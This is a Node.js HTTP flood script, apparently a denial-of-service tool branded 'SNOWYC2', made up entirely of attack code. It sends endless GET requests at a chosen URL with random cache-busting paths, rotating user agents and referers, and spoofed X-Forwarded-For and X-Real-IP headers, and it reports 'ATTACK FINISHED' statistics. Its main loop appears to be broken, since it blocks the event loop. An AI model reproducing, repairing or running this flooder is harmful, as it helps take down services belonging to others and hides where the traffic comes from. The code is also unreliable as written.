const http = require('http');
const https = require('https');
const fs = require('fs');
const { URL } = require('url');

const target = process.argv[2];
const duration = parseInt(process.argv[3] || '60', 10);

if (!target) {
    console.log('Usage: node flood.js <url> <time>');
    process.exit(1);
}

const REFERERS = readLines('refs.txt');
const USER_AGENTS = readLines('ua.txt');

function readLines(file) {
    try {
        return fs.readFileSync(file, 'utf8')
            .split('\n')
            .map(x => x.trim())
            .filter(Boolean);
    } catch {
        return [];
    }
}

const rand = (arr) => arr[Math.floor(Math.random() * arr.length)] || '';
const randIP = () => Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
const randPath = () => `/?cb=${Math.random().toString(36).substring(2)}`;

const u = new URL(target);
const client = u.protocol === 'https:' ? https : http;
const port = u.port || (u.protocol === 'https:' ? 443 : 80);

const headersTemplate = () => ({
    'User-Agent': rand(USER_AGENTS),
    'Referer': rand(REFERERS),
    'X-Forwarded-For': randIP(),
    'X-Real-IP': randIP(),
    'Accept': '*/*',
    'Connection': 'keep-alive'
});

let total = 0;
let success = 0;
let failed = 0;
let peakRps = 0;

console.log(`\n  SNOWYC2 - RAW FLOOD MODE`);
console.log(`  ===============================`);
console.log(`  TARGET: ${target}`);
console.log(`  TIME:   ${duration}s`);
console.log(`  ===============================\n`);

let last = 0;
const start = Date.now();
let running = true;

setTimeout(() => running = false, duration * 1000);

setInterval(() => {
    const current = total;
    const rps = current - last;
    last = current;
    peakRps = Math.max(peakRps, rps);
    process.stdout.write(`\rSENT: ${total} | OK: ${success} | ERR: ${failed} | RPS: ${rps}`);
}, 1000);

function floodForever() {
    while (running) {
        const path = u.pathname + randPath();
        const options = {
            hostname: u.hostname,
            port: port,
            path: path,
            method: 'GET',
            headers: headersTemplate(),
            agent: false
        };

        const req = client.request(options, res => {
            total++;
            res.statusCode === 200 ? success++ : failed++;
            res.resume();
        });

        req.on('error', () => {
            total++;
            failed++;
        });

        req.end();
    }
}

for (;;) {
    if (!running) break;
    setImmediate(floodForever);
}

process.on('exit', () => {
    const elapsed = (Date.now() - start) / 1000;
    console.log('\n\n  ATTACK FINISHED');
    console.log('  ===============================');
    console.log(`  TIME:     ${elapsed.toFixed(1)}s`);
    console.log(`  TOTAL:    ${total}`);
    console.log(`  SUCCESS:  ${success}`);
    console.log(`  ERRORS:   ${failed}`);
    console.log(`  AVG RPS:  ${(total / elapsed).toFixed(1)}`);
    console.log(`  PEAK RPS: ${peakRps}`);
    console.log('  ===============================\n');
});
